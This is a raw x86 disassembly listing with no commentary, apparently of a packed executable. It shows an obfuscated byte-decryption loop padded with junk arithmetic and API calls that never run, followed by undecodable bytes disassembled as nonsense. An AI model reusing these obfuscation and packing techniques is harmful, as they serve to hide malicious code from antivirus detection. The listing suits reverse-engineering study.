  415b35:	push   DWORD PTR [ebp-0xc]
  415b38:	push   0x437042
  415b3d:	push   DWORD PTR [ebp-0x14]
  415b40:	push   0x4370f4
  415b45:	push   DWORD PTR [ebp-0x20]
  415b48:	push   DWORD PTR [ebp-0x20]
  415b4b:	call   DWORD PTR ds:0x43ca10
  415b51:	cmp    DWORD PTR ds:0x437717,0x5
  415b58:	jne    0x415b6b
  415b5e:	mov    ecx,DWORD PTR ds:0x437717
  415b64:	inc    ecx
  415b65:	mov    DWORD PTR ds:0x437717,ecx
  415b6b:	jmp    0x415b09
  415b70:	mov    DWORD PTR [ebp-0xc4],eax
  415b76:	mov    DWORD PTR [ebp-0x98],0xf89c8527
  415b80:	mov    DWORD PTR [ebp-0x90],0xf89c85bd
  415b8a:	and    DWORD PTR ds:0x43777b,0x0
  415b94:	jmp    0x415ba6
  415b99:	mov    ecx,DWORD PTR ds:0x43777b
  415b9f:	inc    ecx
  415ba0:	mov    DWORD PTR ds:0x43777b,ecx
  415ba6:	cmp    DWORD PTR ds:0x43777b,0x18
  415bad:	jae    0x415bda
  415bb3:	cmp    DWORD PTR ds:0x43777b,0x20
  415bba:	jb     0x415bda
  415bc0:	jmp    0x415bd5
  415bc5:	push   0x4b28
  415bca:	push   0x437737
  415bcf:	call   DWORD PTR ds:0x43c960
  415bd5:	jmp    0x415b99
  415bda:	mov    DWORD PTR [ebp-0xa0],0xf89c85b0
  415be4:	mov    DWORD PTR [ebp-0xa4],0xf89c85b3
  415bee:	mov    DWORD PTR [ebp-0x8c],0xf89c85b2
  415bf8:	or     DWORD PTR ds:0x43773f,edi
  415bfe:	mov    eax,DWORD PTR [ebp-0xa4]
  415c04:	mov    ecx,DWORD PTR ds:0x4377d3
  415c0a:	mov    ecx,DWORD PTR [ecx]
  415c0c:	sbb    DWORD PTR ds:0x437767,ecx
  415c12:	xor    eax,0x75108b5
  415c17:	add    DWORD PTR ds:0x4377a7,0x2ea0
  415c21:	add    eax,0x3272fb
  415c26:	mov    ecx,DWORD PTR ds:0x43779f
  415c2c:	sub    DWORD PTR ds:0x437743,ecx
  415c32:	mov    ecx,DWORD PTR [ebp-0xc4]
  415c38:	sub    ecx,eax
  415c3a:	mov    DWORD PTR ds:0x437767,0x6669
  415c44:	mov    DWORD PTR [ebp-0x94],ecx
  415c4a:	mov    DWORD PTR [ebp-0x9c],0xf89c85bf
  415c54:	mov    DWORD PTR ds:0x4377b3,0x3984
  415c5e:	cmp    DWORD PTR [ebp-0x8c],0xf89c85b0
  415c68:	mov    DWORD PTR ds:0x437797,0x4ae3
  415c72:	je     0x416422
  415c78:	mov    eax,DWORD PTR [ebp-0xa4]
  415c7e:	neg    ecx
  415c80:	xor    eax,0x75108b5
  415c85:	mov    ecx,DWORD PTR [ebp-0xa4]
  415c8b:	xor    ecx,0x75108b5
  415c91:	adc    DWORD PTR ds:0x4377a7,0x380b
  415c9b:	lea    ecx,[eax+ecx*1+0x64e5f6]
  415ca2:	mov    eax,DWORD PTR [ebp-0x94]
  415ca8:	xor    edx,edx
  415caa:	div    ecx
  415cac:	mov    eax,DWORD PTR [ebp-0x8c]
  415cb2:	add    DWORD PTR ds:0x43774b,ebx
  415cb8:	xor    eax,0x75108b5
  415cbd:	and    DWORD PTR ds:0x437713,0x450a
  415cc7:	add    eax,0x3272fb
  415ccc:	mov    ecx,DWORD PTR [ebp-0xa4]
  415cd2:	xor    ecx,0x75108b5
  415cd8:	add    ecx,0x3272fb
  415cde:	and    DWORD PTR ds:0x437773,0x437743
  415ce8:	sub    eax,ecx
  415cea:	cmp    edx,eax
  415cec:	jne    0x4160ed
  415cf2:	sbb    eax,0x28b5
  415cf7:	mov    eax,DWORD PTR [ebp-0x8]
  415cfa:	xor    DWORD PTR ds:0x43774f,0x2b4e
  415d04:	add    eax,DWORD PTR [ebp-0x94]
  415d0a:	sbb    DWORD PTR ds:0x4377b7,0x43775f
  415d14:	mov    al,BYTE PTR [eax]
  415d16:	mov    BYTE PTR [ebp-0xb9],al
  415d1c:	sub    DWORD PTR ds:0x43771f,ebx
  415d22:	mov    eax,DWORD PTR [ebp-0xa0]
  415d28:	or     DWORD PTR ds:0x4377a3,0x437787
  415d32:	xor    eax,0x75108b5
  415d37:	add    eax,0x3272fb
  415d3c:	mov    DWORD PTR ds:0x43770f,0x2af0
  415d46:	mov    DWORD PTR [ebp-0xc0],eax
  415d4c:	mov    DWORD PTR ds:0x437777,0x3812
  415d56:	jmp    0x415d7c
  415d5b:	sbb    DWORD PTR ds:0x437727,0x43779f
  415d65:	mov    eax,DWORD PTR [ebp-0xc0]
  415d6b:	and    DWORD PTR ds:0x437717,0x4377b3
  415d75:	inc    eax
  415d76:	mov    DWORD PTR [ebp-0xc0],eax
  415d7c:	sub    eax,0x6bb3
  415d81:	mov    eax,DWORD PTR [ebp-0x9c]
  415d87:	add    DWORD PTR ds:0x43774f,0x4377bb
  415d91:	xor    eax,0x75108b5
  415d96:	xor    DWORD PTR ds:0x437777,0x2bbf
  415da0:	add    eax,0x3272fb
  415da5:	mov    DWORD PTR ds:0x437737,0x7b12
  415daf:	cmp    DWORD PTR [ebp-0xc0],eax
  415db5:	jae    0x415f32
  415dbb:	inc    ecx
  415dbc:	mov    eax,DWORD PTR [ebp-0xc0]
  415dc2:	sub    eax,0x3272fb
  415dc7:	add    DWORD PTR ds:0x43778f,0x4ea7
  415dd1:	xor    eax,0x75108b5
  415dd6:	or     ecx,DWORD PTR ds:0x43772f
  415ddc:	add    eax,0x7f55d8f2
  415de1:	mov    ecx,0x39f3
  415de6:	mov    ecx,DWORD PTR [ebp-0xc0]
  415dec:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415df3:	mov    DWORD PTR ds:0x43774b,edx
  415df9:	mov    eax,DWORD PTR [ebp-0xc0]
  415dff:	cmp    DWORD PTR [ebp+eax*4-0xb8],0x244ecb9d
  415e0a:	mov    DWORD PTR ds:0x437753,0x65ed
  415e14:	jbe    0x415e94
  415e1a:	mov    DWORD PTR ds:0x437763,0xe32
  415e24:	mov    eax,DWORD PTR [ebp-0xc0]
  415e2a:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415e31:	and    DWORD PTR ds:0x43773f,0x0
  415e3b:	mov    ecx,DWORD PTR ds:0x43773f
  415e41:	inc    ecx
  415e42:	mov    DWORD PTR ds:0x43773f,ecx
  415e48:	cmp    DWORD PTR ds:0x43773f,0x2b
  415e4f:	jbe    0x415e77
  415e55:	jmp    0x415e6a
  415e5a:	push   0x437094
  415e5f:	push   0x437094
  415e64:	call   DWORD PTR ds:0x43c964
  415e6a:	cmp    DWORD PTR ds:0x43773f,0x1e
  415e71:	jb     0x415e3b
  415e77:	add    eax,0x405fcdc
  415e7c:	mov    ecx,DWORD PTR ds:0x4377a7
  415e82:	mov    ecx,DWORD PTR [ebp-0xc0]
  415e88:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415e8f:	jmp    0x415f23
  415e94:	and    ecx,DWORD PTR ds:0x43775b
  415e9a:	mov    eax,DWORD PTR [ebp-0xc0]
  415ea0:	mov    eax,DWORD PTR [ebp+eax*4-0xb8]
  415ea7:	and    DWORD PTR ds:0x4377bb,0x0
  415eb1:	jmp    0x415ec3
  415eb6:	mov    ecx,DWORD PTR ds:0x4377bb
  415ebc:	inc    ecx
  415ebd:	mov    DWORD PTR ds:0x4377bb,ecx
  415ec3:	cmp    DWORD PTR ds:0x4377bb,0x1b
  415eca:	jae    0x415f0c
  415ed0:	cmp    DWORD PTR ds:0x4377bb,0x5
  415ed7:	ja     0x415f0c
  415edd:	jmp    0x415eed
  415ee2:	push   0x4370a4
  415ee7:	call   DWORD PTR ds:0x43c968
  415eed:	cmp    DWORD PTR ds:0x4377bb,0x4
  415ef4:	jne    0x415f07
  415efa:	mov    ecx,DWORD PTR ds:0x4377bb
  415f00:	inc    ecx
  415f01:	mov    DWORD PTR ds:0x4377bb,ecx
  415f07:	jmp    0x415eb6
  415f0c:	sub    eax,0x250bcdc
  415f11:	mov    ecx,0x72b4
  415f16:	mov    ecx,DWORD PTR [ebp-0xc0]
  415f1c:	mov    DWORD PTR [ebp+ecx*4-0xb8],eax
  415f23:	mov    DWORD PTR ds:0x4377b7,0x3b3c
  415f2d:	jmp    0x415d5b
  415f32:	xor    eax,eax
  415f34:	mov    DWORD PTR ds:0x43779b,0x35fa
  415f3e:	jne    0x415f77
  415f44:	and    eax,0x5148
  415f49:	movzx  eax,BYTE PTR [ebp-0xb9]
  415f50:	xor    eax,0x83
  415f55:	sbb    DWORD PTR ds:0x437797,0x43771b
  415f5f:	add    eax,0x8
  415f62:	mov    DWORD PTR ds:0x4377ab,0x5d96
  415f6c:	mov    BYTE PTR [ebp-0xb9],al
  415f72:	jmp    0x4160c6
  415f77:	and    DWORD PTR ds:0x4377af,0x0
  415f81:	jmp    0x415f93
  415f86:	mov    ecx,DWORD PTR ds:0x4377af
  415f8c:	inc    ecx
  415f8d:	mov    DWORD PTR ds:0x4377af,ecx
  415f93:	cmp    DWORD PTR ds:0x4377af,0x1a
  415f9a:	jae    0x415fd5
  415fa0:	cmp    DWORD PTR ds:0x4377af,0x1e
  415fa7:	jl     0x415fd5
  415fad:	jmp    0x415fd0
  415fb2:	push   DWORD PTR [ebp-0x14]
  415fb5:	push   0x43772f
  415fba:	push   DWORD PTR [ebp-0x20]
  415fbd:	push   0x43716e
  415fc2:	push   DWORD PTR [ebp-0x28]
  415fc5:	push   0x6705
  415fca:	call   DWORD PTR ds:0x43c96c
  415fd0:	jmp    0x415f86
  415fd5:	mov    eax,DWORD PTR [ebp-0x98]
  415fdb:	and    DWORD PTR ds:0x437757,0x0
  415fe5:	jmp    0x415ff7
  415fea:	mov    ecx,DWORD PTR ds:0x437757
  415ff0:	inc    ecx
  415ff1:	mov    DWORD PTR ds:0x437757,ecx
  415ff7:	cmp    DWORD PTR ds:0x437757,0x1b
  415ffe:	jae    0x416043
  416004:	cmp    DWORD PTR ds:0x437757,0x9
  41600b:	jge    0x416043
  416011:	jmp    0x416024
  416016:	push   0x43770f
  41601b:	push   DWORD PTR [ebp-0x18]
  41601e:	call   DWORD PTR ds:0x43c970
  416024:	cmp    DWORD PTR ds:0x437757,0x8
  41602b:	jne    0x41603e
  416031:	mov    ecx,DWORD PTR ds:0x437757
  416037:	inc    ecx
  416038:	mov    DWORD PTR ds:0x437757,ecx
  41603e:	jmp    0x415fea
  416043:	xor    eax,0x75108b5
  416048:	mov    ecx,DWORD PTR ds:0x437743
  41604e:	add    DWORD PTR ds:0x4377b7,ecx
  416054:	add    eax,0x3272fb
  416059:	mov    ecx,DWORD PTR ds:0x437727
  41605f:	add    DWORD PTR ds:0x43771f,ecx
  416065:	movzx  ecx,BYTE PTR [ebp-0xb9]
  41606c:	sub    ecx,eax
  41606e:	mov    BYTE PTR [ebp-0xb9],cl
  416074:	adc    DWORD PTR ds:0x43779f,0x43771f
  41607e:	mov    ecx,DWORD PTR [ebp-0x90]
  416084:	xor    DWORD PTR ds:0x43773f,0x437753
  41608e:	xor    ecx,0x75108b5
  416094:	adc    DWORD PTR ds:0x437727,0x43774f
  41609e:	add    ecx,0x3272fb
  4160a4:	mov    al,BYTE PTR [ebp-0xb9]
  4160aa:	and    DWORD PTR ds:0x43771f,0x6ab7
  4160b4:	ror    al,cl
  4160b6:	sub    DWORD PTR ds:0x43770f,0x1214
  4160c0:	mov    BYTE PTR [ebp-0xb9],al
  4160c6:	sub    DWORD PTR ds:0x43778f,0x437757
  4160d0:	xor    eax,eax
  4160d2:	mov    eax,DWORD PTR [ebp-0x8]
  4160d5:	add    eax,DWORD PTR [ebp-0x94]
  4160db:	or     DWORD PTR ds:0x437717,0x5827
  4160e5:	mov    cl,BYTE PTR [ebp-0xb9]
  4160eb:	mov    BYTE PTR [eax],cl
  4160ed:	mov    eax,DWORD PTR [ebp-0x94]
  4160f3:	sub    DWORD PTR ds:0x43771b,0x437777
  4160fd:	sub    eax,0x3272fb
  416102:	sub    DWORD PTR ds:0x437777,0x76d0
  41610c:	xor    eax,0x75108b5
  416111:	mov    DWORD PTR ds:0x43773f,0x3e21
  41611b:	cmp    eax,DWORD PTR [ebp-0xa0]
  416121:	mov    DWORD PTR ds:0x437797,0x79e9
  41612b:	jne    0x416341
  416131:	mov    eax,DWORD PTR [ebp-0x8c]
  416137:	xor    eax,0x75108b5
  41613c:	add    eax,0x3272fb
  416141:	mov    ecx,DWORD PTR ds:0x43771b
  416147:	adc    DWORD PTR ds:0x43772f,ecx
  41614d:	mov    ecx,DWORD PTR [ebp-0xa4]
  416153:	and    DWORD PTR ds:0x43779b,0x4377bb
  41615d:	xor    ecx,0x75108b5
  416163:	add    ecx,0x3272fb
  416169:	sub    eax,ecx
  41616b:	and    DWORD PTR ds:0x437793,0x0
  416175:	mov    ecx,DWORD PTR ds:0x437793
  41617b:	inc    ecx
  41617c:	mov    DWORD PTR ds:0x437793,ecx
  416182:	cmp    DWORD PTR ds:0x437793,0x2b
  416189:	jbe    0x4161c3
  41618f:	jmp    0x4161b6
  416194:	push   0x170b
  416199:	push   0x43772f
  41619e:	push   DWORD PTR [ebp-0x1c]
  4161a1:	push   0x437061
  4161a6:	push   0x5827
  4161ab:	push   0x27a3
  4161b0:	call   DWORD PTR ds:0x43c978
  4161b6:	cmp    DWORD PTR ds:0x437793,0x1d
  4161bd:	jb     0x416175
  4161c3:	sub    eax,0x3272fb
  4161c8:	xor    eax,0x75108b5
  4161cd:	and    DWORD PTR ds:0x437713,0x0
  4161d7:	mov    ecx,DWORD PTR ds:0x437713
  4161dd:	inc    ecx
  4161de:	mov    DWORD PTR ds:0x437713,ecx
  4161e4:	cmp    DWORD PTR ds:0x437713,0x9
  4161eb:	jle    0x41623d
  4161f1:	jmp    0x416216
  4161f6:	push   0x437094
  4161fb:	push   DWORD PTR [ebp-0x14]
  4161fe:	push   0x6d50
  416203:	push   0x1b74
  416208:	push   DWORD PTR [ebp-0x18]
  41620b:	push   0x79a3
  416210:	call   DWORD PTR ds:0x43c97c
  416216:	cmp    DWORD PTR ds:0x437713,0x8
  41621d:	jne    0x416230
  416223:	mov    ecx,DWORD PTR ds:0x437713
  416229:	inc    ecx
  41622a:	mov    DWORD PTR ds:0x437713,ecx
  416230:	cmp    DWORD PTR ds:0x437713,0x19
  416237:	jb     0x4161d7
  41623d:	mov    DWORD PTR [ebp-0x8c],eax
  416243:	mov    eax,DWORD PTR [ebp-0xa4]
  416249:	and    DWORD PTR ds:0x43777f,0x0
  416253:	mov    ecx,DWORD PTR ds:0x43777f
  416259:	inc    ecx
  41625a:	mov    DWORD PTR ds:0x43777f,ecx
  416260:	cmp    DWORD PTR ds:0x43777f,0x10
  416267:	jb     0x4162ac
  41626d:	jmp    0x416285
  416272:	push   0x437042
  416277:	push   0x437089
  41627c:	push   DWORD PTR [ebp-0x24]
  41627f:	call   DWORD PTR ds:0x43c980
  416285:	cmp    DWORD PTR ds:0x43777f,0xf
  41628c:	jne    0x41629f
  416292:	mov    ecx,DWORD PTR ds:0x43777f
  416298:	inc    ecx
  416299:	mov    DWORD PTR ds:0x43777f,ecx
  41629f:	cmp    DWORD PTR ds:0x43777f,0x1f
  4162a6:	jb     0x416253
  4162ac:	xor    eax,0x75108b5
  4162b1:	mov    DWORD PTR ds:0x43779f,0x13
  4162bb:	cmp    DWORD PTR ds:0x43779f,0x0
  4162c2:	je     0x416323
  4162c8:	cmp    DWORD PTR ds:0x43779f,0x4
  4162cf:	jg     0x416323
  4162d5:	jmp    0x4162f5
  4162da:	push   0x664a
  4162df:	push   DWORD PTR [ebp-0x28]
  4162e2:	push   DWORD PTR [ebp-0xc]
  4162e5:	push   0x1a11
  4162ea:	push   0x533a
  4162ef:	call   DWORD PTR ds:0x43c984
  4162f5:	cmp    DWORD PTR ds:0x43779f,0x5
  4162fc:	jne    0x416311
  416302:	xor    ecx,ecx
  416304:	add    ecx,DWORD PTR ds:0x43779f
  41630a:	dec    ecx
  41630b:	mov    DWORD PTR ds:0x43779f,ecx
  416311:	mov    ecx,DWORD PTR ds:0x43779f
  416317:	dec    ecx
  416318:	mov    DWORD PTR ds:0x43779f,ecx
  41631e:	jmp    0x4162bb
  416323:	add    eax,0x3272fb
  416328:	sbb    ecx,DWORD PTR ds:0x437713
  41632e:	mov    ecx,DWORD PTR [ebp-0xc4]
  416334:	sub    ecx,eax
  416336:	mov    DWORD PTR [ebp-0x94],ecx
  41633c:	jmp    0x41641d
  416341:	mov    DWORD PTR ds:0x43774b,0x19
  41634b:	cmp    DWORD PTR ds:0x43774b,0x0
  416352:	je     0x416387
  416358:	cmp    DWORD PTR ds:0x43774b,0x1e
  41635f:	ja     0x416387
  416365:	jmp    0x416373
  41636a:	push   DWORD PTR [ebp-0x18]
  41636d:	call   DWORD PTR ds:0x43c988
  416373:	xor    ecx,ecx
  416375:	add    ecx,DWORD PTR ds:0x43774b
  41637b:	dec    ecx
  41637c:	mov    DWORD PTR ds:0x43774b,ecx
  416382:	jmp    0x41634b
  416387:	mov    eax,DWORD PTR [ebp-0xa4]
  41638d:	and    ecx,DWORD PTR ds:0x437743
  416393:	xor    eax,0x75108b5
  416398:	and    DWORD PTR ds:0x4377af,0x0
  4163a2:	jmp    0x4163b4
  4163a7:	mov    ecx,DWORD PTR ds:0x4377af
  4163ad:	inc    ecx
  4163ae:	mov    DWORD PTR ds:0x4377af,ecx
  4163b4:	cmp    DWORD PTR ds:0x4377af,0x13
  4163bb:	jae    0x416400
  4163c1:	cmp    DWORD PTR ds:0x4377af,0x8
  4163c8:	jb     0x416400
  4163ce:	jmp    0x4163e1
  4163d3:	push   0x3598
  4163d8:	push   DWORD PTR [ebp-0x1c]
  4163db:	call   DWORD PTR ds:0x43c98c
  4163e1:	cmp    DWORD PTR ds:0x4377af,0x7
  4163e8:	jne    0x4163fb
  4163ee:	mov    ecx,DWORD PTR ds:0x4377af
  4163f4:	inc    ecx
  4163f5:	mov    DWORD PTR ds:0x4377af,ecx
  4163fb:	jmp    0x4163a7
  416400:	add    eax,0x3272fb
  416405:	mov    ecx,DWORD PTR [ebp-0x94]
  41640b:	sub    ecx,eax
  41640d:	mov    DWORD PTR ds:0x437753,0x2d68
  416417:	mov    DWORD PTR [ebp-0x94],ecx
  41641d:	jmp    0x415c54
  416422:	mov    eax,DWORD PTR [ebp-0x2c]
  416425:	mov    DWORD PTR ds:0x437763,0x1dfd
  41642f:	mov    DWORD PTR [ebp-0x100],eax
  416435:	or     DWORD PTR ds:0x437777,0x29f8
  41643f:	mov    DWORD PTR [ebp-0xd4],0xf89c8527
  416449:	mov    DWORD PTR [ebp-0xcc],0xf89c85bd
  416453:	mov    DWORD PTR [ebp-0xdc],0xf89c85b0
  41645d:	mov    eax,ds:0x43778f
  416462:	and    DWORD PTR ds:0x43776f,eax
  416468:	mov    DWORD PTR [ebp-0xe0],0xf89c85b3
  416472:	mov    DWORD PTR [ebp-0xc8],0xf89c85b2
  41647c:	mov    DWORD PTR ds:0x43776b,0x16
  416486:	cmp    DWORD PTR ds:0x43776b,0x0
  41648d:	je     0x4164e1
  416493:	cmp    DWORD PTR ds:0x43776b,0xa
  41649a:	jg     0x4164e1
  4164a0:	jmp    0x4164b5
  4164a5:	push   0x437797
  4164aa:	push   0x167f
  4164af:	call   DWORD PTR ds:0x43c990
  4164b5:	cmp    DWORD PTR ds:0x43776b,0xb
  4164bc:	jne    0x4164cf
  4164c2:	mov    ecx,DWORD PTR ds:0x43776b
  4164c8:	dec    ecx
  4164c9:	mov    DWORD PTR ds:0x43776b,ecx
  4164cf:	mov    ecx,DWORD PTR ds:0x43776b
  4164d5:	dec    ecx
  4164d6:	mov    DWORD PTR ds:0x43776b,ecx
  4164dc:	jmp    0x416486
  4164e1:	mov    eax,DWORD PTR [ebp-0xe0]
  4164e7:	xor    eax,0x75108b5
  4164ec:	xor    ecx,ecx
  4164ee:	xor    ecx,DWORD PTR ds:0x437713
  4164f4:	sbb    ecx,DWORD PTR ds:0x43774b
  4164fa:	mov    DWORD PTR ds:0x437713,ecx
  416500:	add    eax,0x3272fb
  416505:	mov    ecx,DWORD PTR [ebp-0x100]
  41650b:	and    DWORD PTR ds:0x437753,0x43772b
  416515:	sub    ecx,eax
  416517:	mov    DWORD PTR [ebp-0xd0],ecx
  41651d:	mov    DWORD PTR ds:0x43779f,0x77e5
  416527:	mov    DWORD PTR [ebp-0xd8],0xf89c85bf
  416531:	mov    DWORD PTR ds:0x4377bb,0x62a5
  41653b:	cmp    DWORD PTR [ebp-0xc8],0xf89c85b0
  416545:	mov    DWORD PTR ds:0x4377b7,0x2244
  41654f:	je     0x418baf
  416555:	mov    eax,DWORD PTR [ebp-0xe0]
  41655b:	xor    DWORD PTR ds:0x43775b,edx
  416561:	xor    eax,0x75108b5
  416566:	mov    ecx,DWORD PTR [ebp-0xe0]
  41656c:	sub    DWORD PTR ds:0x437747,0x6975
  416576:	xor    ecx,0x75108b5
  41657c:	lea    ecx,[eax+ecx*1+0x64e5f6]
  416583:	mov    eax,DWORD PTR [ebp-0xd0]
  416589:	adc    DWORD PTR ds:0x437723,0x43771b
  416593:	xor    edx,edx
  416595:	sub    DWORD PTR ds:0x437773,0x43778b
  41659f:	div    ecx
  4165a1:	and    DWORD PTR ds:0x437757,0x0
  4165ab:	jmp    0x4165bf
  4165b0:	xor    ecx,ecx
  4165b2:	xor    ecx,DWORD PTR ds:0x437757
  4165b8:	inc    ecx
  4165b9:	mov    DWORD PTR ds:0x437757,ecx
  4165bf:	cmp    DWORD PTR ds:0x437757,0x12
  4165c6:	jae    0x4165fc
  4165cc:	cmp    DWORD PTR ds:0x437757,0x14
  4165d3:	jg     0x4165fc
  4165d9:	jmp    0x4165f7
  4165de:	push   DWORD PTR [ebp-0x24]
  4165e1:	push   DWORD PTR [ebp-0x28]
  4165e4:	push   0x437094
  4165e9:	push   0x437061
  4165ee:	push   DWORD PTR [ebp-0x24]
  4165f1:	call   DWORD PTR ds:0x43c994
  4165f7:	jmp    0x4165b0
  4165fc:	mov    eax,DWORD PTR [ebp-0xc8]
  416602:	xor    eax,0x75108b5
  416607:	add    eax,0x3272fb
  41660c:	mov    ecx,DWORD PTR [ebp-0xe0]
  416612:	xor    ecx,0x75108b5
  416618:	add    ecx,0x3272fb
  41661e:	jmp    0x4189c4
  416623:	test   eax,0x60a2e213
  416628:	jb     0x416613
  41662a:	adc    dh,ah
  41662c:	or     BYTE PTR ds:[edi-0x28dd5265],0xb2
  416634:	xchg   ecx,eax
  416635:	jp     0x4166b2
  416637:	add    bl,BYTE PTR [eax-0xa8485]
  41663d:	retf   
  41663e:	or     eax,0xb2f9cb00
  416643:	not    eax
  416645:	(bad)  
  416646:	out    dx,eax
  416647:	rol    cl,0xd2
  41664a:	fcmovnbe st,st(1)
  41664c:	(bad)  
  41664d:	into   
  41664e:	mov    edi,0xd7f4d6b9
  416653:	(bad)  
  416655:	mov    esi,0xdfd8bdc6
  41665a:	pop    es
  41665b:	add    eax,0xef02e3c9
  416660:	int3   
  416661:	fsub   st(2),st
  416663:	xlat   BYTE PTR ds:[ebx]
  416664:	ror    edx,cl
  416666:	mov    cl,0xd6
  416668:	test   eax,0xcaaef1ca
  41666d:	aam    0xef
  41666f:	retf   
  416670:	hlt    
  416671:	jmp    0xd0fa:0xe2b8efe2
  416678:	add    ecx,ebx
  41667a:	fstp   st(5)
  41667c:	sti    
  41667d:	(bad)  
  41667e:	push   ebx
  416680:	in     al,dx
  416681:	shl    BYTE PTR [ebx-0x1914503a],0xb0
  416688:	mov    ch,0xa8
  41668a:	(bad)  
  41668b:	ror    ebx,1
  41668d:	(bad)  
  41668e:	rol    esp,cl
  416690:	xlat   BYTE PTR ds:[ebx]
  416691:	mov    edi,0xf2c3c8d5
  416696:	icebp  
  416697:	fdiv   st,st(0)
  416699:	add    bh,cl
  41669b:	in     al,0xe5
  41669d:	retf   0x1db
  4166a0:	fild   WORD PTR [eax+ebx*8]
  4166a3:	out    dx,al
  4166a4:	mov    edi,0xebebe6ed
  4166a9:	lods   al,BYTE PTR ds:[esi]
  4166aa:	shl    BYTE PTR [eax-0x330d242c],cl
  4166b0:	mov    cl,0xd1
  4166b2:	add    ah,bh
  4166b4:	fdiv   st(2),st
  4166b6:	repz mov ebp,0xadad2bc
  4166bc:	cli    
  4166bd:	jmp    0x4166cd
  4166bf:	add    al,0xa
  4166c1:	cli    
  4166c2:	(bad)
  4166c5:	enter  0xaecf,0xc4
  4166c9:	shl    BYTE PTR [edi+ecx*8-0x2b322b19],1
  4166d0:	sar    DWORD PTR [eax-0x42fc0b18],cl
  4166d6:	sar    BYTE PTR [esp+edx*8-0x1927f9f9],0xc4
  4166de:	aad    0xf8
  4166e0:	loope  0x4166d5
  4166e2:	out    dx,al
  4166e3:	out    dx,al
  4166e4:	div    BYTE PTR [eax-0x4f4e180b]
  4166ea:	fadd   st,st(6)
  4166ec:	out    dx,eax
  4166ed:	retf   
  4166ee:	jmp    0x31021d1
  4166f3:	loop   0x4166d6
  4166f5:	loop   0x4166d9
  4166f7:	out    0xfb,eax
  4166f9:	loope  0x4166bd
  4166fb:	call   ebp
  4166fd:	add    al,0xf5
  4166ff:	push   cs
  416700:	loopne 0x416714
  416702:	test   eax,0xb6acbec5
  416707:	int    0xb0
  416709:	cmc    
  41670a:	fcmovnbe st,st(0)
  41670c:	sar    edi,cl
  41670e:	fmul   st(5),st
  416710:	mov    ecx,0xc3fed0ca
  416715:	out    dx,al
  416716:	int3   
  416717:	mov    edx,0x2cb00d8
  41671c:	cld    
  41671d:	jmp    0x41670a
  41671f:	loopne 0x41670f
  416721:	or     DWORD PTR [eax-0x4f283a1b],ebp
  416727:	xlat   BYTE PTR ds:[ebx]
  416728:	fcmovb st,st(7)
  41672a:	repnz rcr ebx,1
  41672d:	jmp    0xd7d1:0xf4ffb5be
  416734:	sar    edx,cl
  416736:	fld    st(5)
  416738:	retf   
  416739:	or     ebx,ebx
  41673b:	leave  
  41673c:	sar    dl,0xdc
  41673f:	(bad)  
  416740:	(bad)  
  416742:	lods   eax,DWORD PTR ds:[esi]
  416743:	loopne 0x416727
  416745:	cmc    
  416746:	aam    0xc1
  416748:	loopne 0x416730
  41674a:	retf   
  41674b:	(bad)  
  41674d:	mov    ch,0xf1
  41674f:	(bad)  
  416750:	fnstenv [eax-0x3d314521]
  416756:	xlat   BYTE PTR ds:[ebx]
  416757:	(bad)  
  416759:	mov    esp,0xde09fee6
  41675e:	in     eax,0xc
  416760:	pinsrw mm2,eax,0xa6
  416764:	loop   0x41672e
  416766:	lods   al,BYTE PTR ds:[esi]
  416767:	shl    dh,0xee
  41676a:	jmp    0xd8f9:0xf1b6def5
  416771:	mov    esp,0xd5dfe3fe
  416776:	cli    
  416777:	loopne 0x416776
  416779:	ret    0xf6d0
  41677c:	fcos   
  41677e:	out    0xc2,al
  416780:	or     DWORD PTR ds:0xc3ebc7e1,ecx
  416786:	(bad)  
  416787:	sti    
  416788:	mov    bh,0xac
  41678a:	mov    ecx,0xb8d9d7d2
  41678f:	shr    edi,cl
  416791:	sti    
  416792:	iret   
  416793:	sti    
  416794:	int    0xc7
  416796:	in     eax,dx
  416797:	in     al,dx
  416798:	jmp    0x416794
  41679a:	loopne 0x416785
  41679c:	xlat   BYTE PTR ds:[ebx]
  41679d:	cli    
  41679e:	iret   
  41679f:	ret    0xd801
  4167a2:	call   0xb0243679
  4167a7:	lods   eax,DWORD PTR ds:[esi]
  4167a8:	retf   0xd2d4
  4167ab:	icebp  
  4167ac:	jmp    0x42e1fb0
  4167b1:	cli    
  4167b2:	enter  0xbcbc,0xdb
  4167b6:	in     al,dx
  4167b7:	ftst   
  4167b9:	or     esi,esp
  4167bb:	cmc    
  4167bc:	jmp    0xedca:0xd9ecdadd
  4167c3:	icebp  
  4167c4:	iret   
  4167c5:	mov    bl,0xc6
  4167c7:	in     al,0xcb
  4167c9:	aad    0xaf
  4167cb:	rcr    al,1
  4167cd:	mov    edi,0xd7cfcbba
  4167d2:	xlat   BYTE PTR ds:[ebx]
  4167d3:	not    dh
  4167d5:	int    0xcd
  4167d7:	mov    edx,0xffdfe9f3
  4167dc:	aam    0xdc
  4167de:	out    dx,eax
  4167df:	or     eax,0xf1aede05
  4167e4:	loop   0x4167a2
  4167e6:	cmc    
  4167e7:	les    edi,FWORD PTR [ebx-0x123b3b19]
  4167ed:	in     al,0xdf
  4167ef:	int    0xcc
  4167f1:	(bad)  
  4167f2:	cmc    
  4167f3:	(bad)  
  4167f5:	out    0xdc,eax
  4167f7:	rcr    bl,0x7
  4167fa:	in     al,0xe9
  4167fc:	hlt    
  4167fd:	or     dh,bl
  4167ff:	retf   0xf3fa
  416802:	rol    ah,1
  416804:	lods   eax,DWORD PTR ds:[esi]
  416805:	enter  0xe3f1,0xeb
  416809:	(bad)
  41680c:	enter  0xf0b9,0xb6
  416810:	jmp    0x1f8:0xd1fffb03
  416817:	cmc    
  416818:	out    0xde,eax
  41681a:	(bad)  
  41681c:	add    eax,edi
  41681e:	(bad)  
  416820:	ficom  WORD PTR [ecx]
  416822:	retf   
  416823:	leave  
  416824:	loope  0x416816
  416826:	icebp  
  416827:	jecxz  0x416817
  416829:	aad    0xd3
  41682b:	lock enter 0xcbfe,0xe8
  416830:	cli    
  416831:	fmul   st,st(4)
  416833:	(bad)  
  416834:	clc    
  416835:	lock icebp 
  416837:	mov    edx,0xd7dc09e7
  41683c:	out    0xc7,eax
  41683e:	fcmovnb st,st(5)
  416840:	fild   DWORD PTR [esi]
  416842:	retf   
  416843:	retf   
  416844:	test   dl,0xca
  416847:	lods   al,BYTE PTR ds:[esi]
  416848:	shr    bh,0xc7
  41684b:	mov    ebx,0xf6cddbec
